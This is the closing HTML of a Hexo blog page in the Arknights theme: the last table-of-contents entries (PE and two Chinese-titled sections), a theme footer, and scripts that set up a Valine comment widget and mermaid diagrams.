class="toc-number">5.3.</span> <span class="toc-text">PE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%A2%E5%A4%A7%E6%83%B3%E4%BD%A0%E4%BA%86"><span class="toc-number">5.4.</span> <span class="toc-text">牢大想你了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E8%A7%81%E8%BF%87%E8%93%9D%E8%89%B2%E7%9A%84%E5%B0%8F%E9%B2%B8%E9%B1%BC"><span class="toc-number">5.5.</span> <span class="toc-text">你见过蓝色的小鲸鱼</span></a></li></ol></li></ol></div></div></div><footer><nobr>published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'fvW1eWgLvTdXfECCW1Bu9g6J-gzGzoHsz'
 , appKey: 'stD8FmxHNFFxhkzXholoBHdq' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>